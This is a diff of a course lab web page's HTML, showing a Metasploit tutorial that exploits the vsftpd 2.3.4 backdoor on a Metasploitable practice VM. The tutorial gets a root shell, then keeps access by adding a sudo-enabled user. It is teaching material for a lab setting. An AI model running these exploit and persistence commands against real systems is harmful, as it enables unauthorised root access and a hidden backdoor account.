@@ -333,234 +333,174 @@ msfdb init                           % initialize the database
 <p>Start Metasploit by running <em>msfconsole</em>:</p>
 </div><aside class="col-md-4 chunk ps-2"></aside></div>
 <div class="row g-0 my-3"><div class="col-md-8 px-4 chunk"><div class="source-code-frame mt-3 mb-3">
-<pre class="d-none" id="id97579b">
-You will soon be greeted by an ASCII welcome logo.
-You are now in the Metasploit command console. At any point you can type help or ? to get a list of all available commands. The console functions pretty much like normal Linux terminal.
-
-## Searching for exploits
-
-Metasploit comes with a large number of pre-made exploits (or modules) that you can use. 
-
-To find a particular exploit, type search followed by a keyword. For example, to search for FTP exploits for Linux type the following command:
-
+<pre class="d-none" id="idc102b5"># msfconsole
 </pre>
-<button type="button" class="copy-button" data-clipboard-target="#id97579b">
+<button type="button" class="copy-button" data-clipboard-target="#idc102b5">
 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-clipboard" viewBox="0 0 16 16">
   		<path d="M4 1.5H3a2 2 0 0 0-2 2V14a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2V3.5a2 2 0 0 0-2-2h-1v1h1a1 1 0 0 1 1 1V14a1 1 0 0 1-1 1H3a1 1 0 0 1-1-1V3.5a1 1 0 0 1 1-1h1v-1z"></path>
   		<path d="M9.5 1a.5.5 0 0 1 .5.5v1a.5.5 0 0 1-.5.5h-3a.5.5 0 0 1-.5-.5v-1a.5.5 0 0 1 .5-.5h3zm-3-1A1.5 1.5 0 0 0 5 1.5v1A1.5 1.5 0 0 0 6.5 4h3A1.5 1.5 0 0 0 11 2.5v-1A1.5 1.5 0 0 0 9.5 0h-3z"></path>
 	</svg>
 </button>
-<p><code># msfconsole</code></p>
-<p>You will soon be greeted by an ASCII welcome logo. You are now in the Metasploit command console. At any point you can type help or ? to get a list of all available commands. The console functions pretty much like normal Linux terminal.</p>
-<h2 id="searching-for-exploits">Searching for exploits</h2>
+<pre><code># msfconsole</code></pre>
+</div></div><aside class="col-md-4 chunk ps-2"></aside></div>
+<div class="row g-0 my-3"><div class="col-md-8 px-4 chunk"><p>You will soon be greeted by an ASCII welcome logo.
+You are now in the Metasploit command console. At any point you can type help or ? to get a list of all available commands. The console functions pretty much like normal Linux terminal.</p>
+<h2>Searching for exploits</h2>
 <p>Metasploit comes with a large number of pre-made exploits (or modules) that you can use.</p>
 <p>To find a particular exploit, type search followed by a keyword. For example, to search for FTP exploits for Linux type the following command:</p>
-<p>```</p>
-</div></div><aside class="col-md-4 chunk ps-2"></aside></div>
-<div class="row g-0 my-3"><div class="col-md-8 px-4 chunk"><p>msf &gt; search platform:unix platform:linux type:exploit ftp</p>
 </div><aside class="col-md-4 chunk ps-2"></aside></div>
 <div class="row g-0 my-3"><div class="col-md-8 px-4 chunk"><div class="source-code-frame mt-3 mb-3">
-<pre class="d-none" id="id4249cd">
-We use both Unix and Linux as platform since most exploits categorized as Unix will work on Linux.
-
-As we saw earlier (during the Nmap scan) our victim runs two FTP servers, so this might be a good start for us.
-
-For more information about the search command, [see here](https://www.offensive-security.com/metasploit-unleashed/msfconsole-commands/#search).
-
-## Using an exploit - How it works
-
-We will first explain the steps needed to use an exploit. Then we will apply these steps to gain remote access to the victim machine using backdoored FTP server. 
-
-Once you have found an exploit that looks promising you need to tell Metasploit how it should be executed. 
-
-The steps for using an exploit are the following:
-
-1. Tell Metasploit which module you want to try with the *use* command:
-
+<pre class="d-none" id="idcffabf">msf > search platform:unix platform:linux type:exploit ftp
 </pre>
-<button type="button" class="copy-button" data-clipboard-target="#id4249cd">
+<button type="button" class="copy-button" data-clipboard-target="#idcffabf">
 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-clipboard" viewBox="0 0 16 16">
   		<path d="M4 1.5H3a2 2 0 0 0-2 2V14a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2V3.5a2 2 0 0 0-2-2h-1v1h1a1 1 0 0 1 1 1V14a1 1 0 0 1-1 1H3a1 1 0 0 1-1-1V3.5a1 1 0 0 1 1-1h1v-1z"></path>
   		<path d="M9.5 1a.5.5 0 0 1 .5.5v1a.5.5 0 0 1-.5.5h-3a.5.5 0 0 1-.5-.5v-1a.5.5 0 0 1 .5-.5h3zm-3-1A1.5 1.5 0 0 0 5 1.5v1A1.5 1.5 0 0 0 6.5 4h3A1.5 1.5 0 0 0 11 2.5v-1A1.5 1.5 0 0 0 9.5 0h-3z"></path>
 	</svg>
 </button>
-<p>```</p>
-<p>We use both Unix and Linux as platform since most exploits categorized as Unix will work on Linux.</p>
+<pre><code>msf &gt; search platform:unix platform:linux type:exploit ftp</code></pre>
+</div></div><aside class="col-md-4 chunk ps-2"></aside></div>
+<div class="row g-0 my-3"><div class="col-md-8 px-4 chunk"><p>We use both Unix and Linux as platform since most exploits categorized as Unix will work on Linux.</p>
 <p>As we saw earlier (during the Nmap scan) our victim runs two FTP servers, so this might be a good start for us.</p>
 <p>For more information about the search command, <a href="https://www.offensive-security.com/metasploit-unleashed/msfconsole-commands/#search">see here</a>.</p>
-<h2 id="using-an-exploit---how-it-works">Using an exploit - How it works</h2>
+<h2>Using an exploit - How it works</h2>
 <p>We will first explain the steps needed to use an exploit. Then we will apply these steps to gain remote access to the victim machine using backdoored FTP server.</p>
 <p>Once you have found an exploit that looks promising you need to tell Metasploit how it should be executed.</p>
 <p>The steps for using an exploit are the following:</p>
-<ol type="1">
+<ol>
 <li>Tell Metasploit which module you want to try with the <em>use</em> command:</li>
 </ol>
-<p>```bash</p>
-</div></div><aside class="col-md-4 chunk ps-2"></aside></div>
-<div class="row g-0 my-3"><div class="col-md-8 px-4 chunk"><p>msf &gt; use exploit/platform/service/exploit_name
-msf exploit(exploit_name) &gt;</p>
 </div><aside class="col-md-4 chunk ps-2"></aside></div>
 <div class="row g-0 my-3"><div class="col-md-8 px-4 chunk"><div class="source-code-frame mt-3 mb-3">
-<pre class="d-none" id="idf0cc3a">
-2. Use the *show options* command to see the parameters that the module uses: 
-
+<pre class="d-none" id="id4b8811">msf > use exploit/platform/service/exploit_name
+msf exploit(exploit_name) >
 </pre>
-<button type="button" class="copy-button" data-clipboard-target="#idf0cc3a">
+<button type="button" class="copy-button" data-clipboard-target="#id4b8811">
 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-clipboard" viewBox="0 0 16 16">
   		<path d="M4 1.5H3a2 2 0 0 0-2 2V14a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2V3.5a2 2 0 0 0-2-2h-1v1h1a1 1 0 0 1 1 1V14a1 1 0 0 1-1 1H3a1 1 0 0 1-1-1V3.5a1 1 0 0 1 1-1h1v-1z"></path>
   		<path d="M9.5 1a.5.5 0 0 1 .5.5v1a.5.5 0 0 1-.5.5h-3a.5.5 0 0 1-.5-.5v-1a.5.5 0 0 1 .5-.5h3zm-3-1A1.5 1.5 0 0 0 5 1.5v1A1.5 1.5 0 0 0 6.5 4h3A1.5 1.5 0 0 0 11 2.5v-1A1.5 1.5 0 0 0 9.5 0h-3z"></path>
 	</svg>
 </button>
-<p>```</p>
-<ol start="2" type="1">
+<div class="sourceCode" id="cb1"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="ex">msf</span> <span class="op">&gt;</span> use exploit/platform/service/exploit_name</span>
+<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a><span class="ex">msf</span> exploit<span class="er">(</span><span class="ex">exploit_name</span><span class="kw">)</span> <span class="op">&gt;</span></span></code></pre></div>
+</div></div><aside class="col-md-4 chunk ps-2"></aside></div>
+<div class="row g-0 my-3"><div class="col-md-8 px-4 chunk"><ol start="2">
 <li>Use the <em>show options</em> command to see the parameters that the module uses:</li>
 </ol>
-<p>```bash</p>
-</div></div><aside class="col-md-4 chunk ps-2"></aside></div>
-<div class="row g-0 my-3"><div class="col-md-8 px-4 chunk"><p>msf exploit(exploit_name) &gt; show options</p>
 </div><aside class="col-md-4 chunk ps-2"></aside></div>
 <div class="row g-0 my-3"><div class="col-md-8 px-4 chunk"><div class="source-code-frame mt-3 mb-3">
-<pre class="d-none" id="id8bbd26">
-3. With the help of the *set* command, set the *RHOST* parameter to the IP address of the victim, i.e., metasploiable machine: 
-
+<pre class="d-none" id="id05cf7d">msf exploit(exploit_name) > show options
 </pre>
-<button type="button" class="copy-button" data-clipboard-target="#id8bbd26">
+<button type="button" class="copy-button" data-clipboard-target="#id05cf7d">
 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-clipboard" viewBox="0 0 16 16">
   		<path d="M4 1.5H3a2 2 0 0 0-2 2V14a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2V3.5a2 2 0 0 0-2-2h-1v1h1a1 1 0 0 1 1 1V14a1 1 0 0 1-1 1H3a1 1 0 0 1-1-1V3.5a1 1 0 0 1 1-1h1v-1z"></path>
   		<path d="M9.5 1a.5.5 0 0 1 .5.5v1a.5.5 0 0 1-.5.5h-3a.5.5 0 0 1-.5-.5v-1a.5.5 0 0 1 .5-.5h3zm-3-1A1.5 1.5 0 0 0 5 1.5v1A1.5 1.5 0 0 0 6.5 4h3A1.5 1.5 0 0 0 11 2.5v-1A1.5 1.5 0 0 0 9.5 0h-3z"></path>
 	</svg>
 </button>
-<p>```</p>
-<ol start="3" type="1">
+<div class="sourceCode" id="cb1"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="ex">msf</span> exploit<span class="er">(</span><span class="ex">exploit_name</span><span class="kw">)</span> <span class="op">&gt;</span> show <span class="ex">options</span></span></code></pre></div>
+</div></div><aside class="col-md-4 chunk ps-2"></aside></div>
+<div class="row g-0 my-3"><div class="col-md-8 px-4 chunk"><ol start="3">
 <li>With the help of the <em>set</em> command, set the <em>RHOST</em> parameter to the IP address of the victim, i.e., metasploiable machine:</li>
 </ol>
-<p>```bash</p>
-</div></div><aside class="col-md-4 chunk ps-2"></aside></div>
-<div class="row g-0 my-3"><div class="col-md-8 px-4 chunk"><p>msf exploit(exploit_name) &gt; set RHOST &lt;IP_address_victim_machine&gt;</p>
 </div><aside class="col-md-4 chunk ps-2"></aside></div>
 <div class="row g-0 my-3"><div class="col-md-8 px-4 chunk"><div class="source-code-frame mt-3 mb-3">
-<pre class="d-none" id="ida38cd2">
-4. type *run* to run the exploit
-
-# Example: Using backdoored FTP server
-
-Having done a vulnerability scan, it’s time to do the actual “hacking”. Your task is now to gain remote access to the Metasploitable machine and make your access persistent.
-
-Backdoors are methods of bypassing the security of a software program or operating system. They are like normal exploits, but they are deliberately part of the software.
-
-Metasploitable has a backdoored version of vsftpd installed and running. If you look back at the vulnerability scan you’ll see that Nessus discovered the backdoor and flagged it as a “Critical” vulnerability.
-
-## Using the backdoor with metasploit
-
-Metasploit has a module that makes it easy to take advantage of this backdoor.
-
-+ Use the following command to search for vsftpd: `msf > search vsftpd`
-
-+ specify the name of the exploit we want to use: `msf > use exploit/unix/ftp/vsftpd_234_backdoor`
-
-+ Set the target IP-address: `msf exploit(vsftpd_234_backdoor) > set RHOST <IP_address_victim_machine>`
-
-+ Run the exploit: `msf exploit(vsftpd_234_backdoor) > run`
-
-You can see from the last line on the screen that the backdoor worked and a shell was open at port 6200 on the victim machine. You are now connected to that shell and can type any commands you want. 
-
-+ Using the command *whoami*, check which user you are running as. You will find out that you are logged in as "root", which means that vsftpd was running with root privileges.
-
-+ Check that you are actually running commands on the remote machine (Metasploitable) and not locally by running the command  `hostname`
-
-+ Try putting the Kali and Metasploitable windows side by side, run the “reboot” command. 
-
-You will notice that when you rebooted Metasploitable, the backdoor shell stopped working. To gain access to the machine we would have to run the exploit again which might be problematic. We need therefore to make our access persistent.
-
-## Making our access persistent
-
-As we saw in the Nmap scan, the victim is already running both SSH and Telnet, so the easiest way to gain persistent access is by adding an extra user to the system.
-
-+ Run the exploit again to get the backdoor shell back, then run the following commands:
-
+<pre class="d-none" id="id359009">msf exploit(exploit_name) > set RHOST <IP_address_victim_machine>
 </pre>
-<button type="button" class="copy-button" data-clipboard-target="#ida38cd2">
+<button type="button" class="copy-button" data-clipboard-target="#id359009">
 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-clipboard" viewBox="0 0 16 16">
   		<path d="M4 1.5H3a2 2 0 0 0-2 2V14a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2V3.5a2 2 0 0 0-2-2h-1v1h1a1 1 0 0 1 1 1V14a1 1 0 0 1-1 1H3a1 1 0 0 1-1-1V3.5a1 1 0 0 1 1-1h1v-1z"></path>
   		<path d="M9.5 1a.5.5 0 0 1 .5.5v1a.5.5 0 0 1-.5.5h-3a.5.5 0 0 1-.5-.5v-1a.5.5 0 0 1 .5-.5h3zm-3-1A1.5 1.5 0 0 0 5 1.5v1A1.5 1.5 0 0 0 6.5 4h3A1.5 1.5 0 0 0 11 2.5v-1A1.5 1.5 0 0 0 9.5 0h-3z"></path>
 	</svg>
 </button>
-<p>```</p>
-<ol start="4" type="1">
+<div class="sourceCode" id="cb1"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="ex">msf</span> exploit<span class="er">(</span><span class="ex">exploit_name</span><span class="kw">)</span> <span class="op">&gt;</span> set <span class="ex">RHOST</span> <span class="op">&lt;</span>IP_address_victim_machine<span class="op">&gt;</span></span></code></pre></div>
+</div></div><aside class="col-md-4 chunk ps-2"></aside></div>
+<div class="row g-0 my-3"><div class="col-md-8 px-4 chunk"><ol start="4">
 <li>type <em>run</em> to run the exploit</li>
 </ol>
-<h1 id="example-using-backdoored-ftp-server">Example: Using backdoored FTP server</h1>
+</div><aside class="col-md-4 chunk ps-2"></aside></div>
+</section>
+<section class="mt-5 mb-5 py-3">
+<div class="row g-0 my-3"><div class="col-md-8 px-4 chunk"><h1>Example: Using backdoored FTP server</h1>
 <p>Having done a vulnerability scan, it’s time to do the actual “hacking”. Your task is now to gain remote access to the Metasploitable machine and make your access persistent.</p>
 <p>Backdoors are methods of bypassing the security of a software program or operating system. They are like normal exploits, but they are deliberately part of the software.</p>
 <p>Metasploitable has a backdoored version of vsftpd installed and running. If you look back at the vulnerability scan you’ll see that Nessus discovered the backdoor and flagged it as a “Critical” vulnerability.</p>
-<h2 id="using-the-backdoor-with-metasploit">Using the backdoor with metasploit</h2>
+<h2>Using the backdoor with metasploit</h2>
 <p>Metasploit has a module that makes it easy to take advantage of this backdoor.</p>
 <ul>
-<li><p>Use the following command to search for vsftpd: <code>msf &gt; search vsftpd</code></p></li>
-<li><p>specify the name of the exploit we want to use: <code>msf &gt; use exploit/unix/ftp/vsftpd_234_backdoor</code></p></li>
-<li><p>Set the target IP-address: <code>msf exploit(vsftpd_234_backdoor) &gt; set RHOST &lt;IP_address_victim_machine&gt;</code></p></li>
-<li><p>Run the exploit: <code>msf exploit(vsftpd_234_backdoor) &gt; run</code></p></li>
+<li>
+<p>Use the following command to search for vsftpd: <code>msf &gt; search vsftpd</code></p>
+</li>
+<li>
+<p>specify the name of the exploit we want to use: <code>msf &gt; use exploit/unix/ftp/vsftpd_234_backdoor</code></p>
+</li>
+<li>
+<p>Set the target IP-address: <code>msf exploit(vsftpd_234_backdoor) &gt; set RHOST &lt;IP_address_victim_machine&gt;</code></p>
+</li>
+<li>
+<p>Run the exploit: <code>msf exploit(vsftpd_234_backdoor) &gt; run</code></p>
+</li>
 </ul>
 <p>You can see from the last line on the screen that the backdoor worked and a shell was open at port 6200 on the victim machine. You are now connected to that shell and can type any commands you want.</p>
 <ul>
-<li><p>Using the command <em>whoami</em>, check which user you are running as. You will find out that you are logged in as “root”, which means that vsftpd was running with root privileges.</p></li>
-<li><p>Check that you are actually running commands on the remote machine (Metasploitable) and not locally by running the command <code>hostname</code></p></li>
-<li><p>Try putting the Kali and Metasploitable windows side by side, run the “reboot” command.</p></li>
+<li>
+<p>Using the command <em>whoami</em>, check which user you are running as. You will find out that you are logged in as &quot;root&quot;, which means that vsftpd was running with root privileges.</p>
+</li>
+<li>
+<p>Check that you are actually running commands on the remote machine (Metasploitable) and not locally by running the command  <code>hostname</code></p>
+</li>
+<li>
+<p>Try putting the Kali and Metasploitable windows side by side, run the “reboot” command.</p>
+</li>
 </ul>
 <p>You will notice that when you rebooted Metasploitable, the backdoor shell stopped working. To gain access to the machine we would have to run the exploit again which might be problematic. We need therefore to make our access persistent.</p>
-<h2 id="making-our-access-persistent">Making our access persistent</h2>
+<h2>Making our access persistent</h2>
 <p>As we saw in the Nmap scan, the victim is already running both SSH and Telnet, so the easiest way to gain persistent access is by adding an extra user to the system.</p>
 <ul>
 <li>Run the exploit again to get the backdoor shell back, then run the following commands:</li>
 </ul>
-<p>```bash</p>
-</div></div><aside class="col-md-4 chunk ps-2"></aside></div>
-<div class="row g-0 my-3"><div class="col-md-8 px-4 chunk"><p>useradd ttm4175 % Add 'ttm175' as a new user
+</div><aside class="col-md-4 chunk ps-2"></aside></div>
+<div class="row g-0 my-3"><div class="col-md-8 px-4 chunk"><div class="source-code-frame mt-3 mb-3">
+<pre class="d-none" id="id564aa4">useradd ttm4175 % Add 'ttm175' as a new user
 passwd ttm4175 % Set the password for the new user
 usermod -aG sudo ttm4175 % Add the user to the 'admin' group, this is equivalent to being root
-reboot</p>
-</div><aside class="col-md-4 chunk ps-2"></aside></div>
-<div class="row g-0 my-3"><div class="col-md-8 px-4 chunk"><div class="source-code-frame mt-3 mb-3">
-<pre class="d-none" id="id9589f9">
-The second command will ask you to enter a password for the new user.
-
-+ After running the reboot command, wait until Metasploitable has rebooted and then try to login with for example telnet: `telnet <IP_address_victim_machine>`
-
-+ After logging in, test that you still can get root access:
-
+reboot
 </pre>
-<button type="button" class="copy-button" data-clipboard-target="#id9589f9">
+<button type="button" class="copy-button" data-clipboard-target="#id564aa4">
 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-clipboard" viewBox="0 0 16 16">
   		<path d="M4 1.5H3a2 2 0 0 0-2 2V14a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2V3.5a2 2 0 0 0-2-2h-1v1h1a1 1 0 0 1 1 1V14a1 1 0 0 1-1 1H3a1 1 0 0 1-1-1V3.5a1 1 0 0 1 1-1h1v-1z"></path>
   		<path d="M9.5 1a.5.5 0 0 1 .5.5v1a.5.5 0 0 1-.5.5h-3a.5.5 0 0 1-.5-.5v-1a.5.5 0 0 1 .5-.5h3zm-3-1A1.5 1.5 0 0 0 5 1.5v1A1.5 1.5 0 0 0 6.5 4h3A1.5 1.5 0 0 0 11 2.5v-1A1.5 1.5 0 0 0 9.5 0h-3z"></path>
 	</svg>
 </button>
-<p>```</p>
-<p>The second command will ask you to enter a password for the new user.</p>
+<div class="sourceCode" id="cb1"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="ex">useradd</span> ttm4175 % Add <span class="st">&#39;ttm175&#39;</span> as a new user</span>
+<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a><span class="fu">passwd</span> ttm4175 % Set the password for the new user</span>
+<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a><span class="ex">usermod</span> <span class="at">-aG</span> sudo ttm4175 % Add the user to the <span class="st">&#39;admin&#39;</span> group, this is equivalent to being root</span>
+<span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a><span class="ex">reboot</span></span></code></pre></div>
+</div></div><aside class="col-md-4 chunk ps-2"></aside></div>
+<div class="row g-0 my-3"><div class="col-md-8 px-4 chunk"><p>The second command will ask you to enter a password for the new user.</p>
 <ul>
-<li><p>After running the reboot command, wait until Metasploitable has rebooted and then try to login with for example telnet: <code>telnet &lt;IP_address_victim_machine&gt;</code></p></li>
-<li><p>After logging in, test that you still can get root access:</p></li>
+<li>
+<p>After running the reboot command, wait until Metasploitable has rebooted and then try to login with for example telnet: <code>telnet &lt;IP_address_victim_machine&gt;</code></p>
+</li>
+<li>
+<p>After logging in, test that you still can get root access:</p>
+</li>
 </ul>
-<p>```bash</p>
-</div></div><aside class="col-md-4 chunk ps-2"></aside></div>
-<div class="row g-0 my-3"><div class="col-md-8 px-4 chunk"><p>$ sudo su % Switch to the root user, 'su' means substitute user</p>
-</div><aside class="col-md-4 chunk ps-2"></aside></div>
-</section>
-<section class="mt-5 mb-5 py-3">
-<div class="row g-0 my-3"><div class="col-md-8 px-4 chunk"><h1>whoami</h1>
 </div><aside class="col-md-4 chunk ps-2"></aside></div>
 <div class="row g-0 my-3"><div class="col-md-8 px-4 chunk"><div class="source-code-frame mt-3 mb-3">
-<pre class="d-none" id="ide56dd0">
+<pre class="d-none" id="id2af93b">$ sudo su % Switch to the root user, 'su' means substitute user
+# whoami
 </pre>
-<button type="button" class="copy-button" data-clipboard-target="#ide56dd0">
+<button type="button" class="copy-button" data-clipboard-target="#id2af93b">
 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-clipboard" viewBox="0 0 16 16">
   		<path d="M4 1.5H3a2 2 0 0 0-2 2V14a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2V3.5a2 2 0 0 0-2-2h-1v1h1a1 1 0 0 1 1 1V14a1 1 0 0 1-1 1H3a1 1 0 0 1-1-1V3.5a1 1 0 0 1 1-1h1v-1z"></path>
   		<path d="M9.5 1a.5.5 0 0 1 .5.5v1a.5.5 0 0 1-.5.5h-3a.5.5 0 0 1-.5-.5v-1a.5.5 0 0 1 .5-.5h3zm-3-1A1.5 1.5 0 0 0 5 1.5v1A1.5 1.5 0 0 0 6.5 4h3A1.5 1.5 0 0 0 11 2.5v-1A1.5 1.5 0 0 0 9.5 0h-3z"></path>
 	</svg>
 </button>
-<p>```</p>
-<p>The last command should print “root” if successful.</p>
+<div class="sourceCode" id="cb1"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> sudo su % Switch to the root user, <span class="st">&#39;su&#39;</span> means substitute user</span>
+<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a><span class="co"># whoami</span></span></code></pre></div>
 </div></div><aside class="col-md-4 chunk ps-2"></aside></div>
+<div class="row g-0 my-3"><div class="col-md-8 px-4 chunk"><p>The last command should print &quot;root&quot; if successful.</p>
+</div><aside class="col-md-4 chunk ps-2"></aside></div>
 </section>
   </main>
 
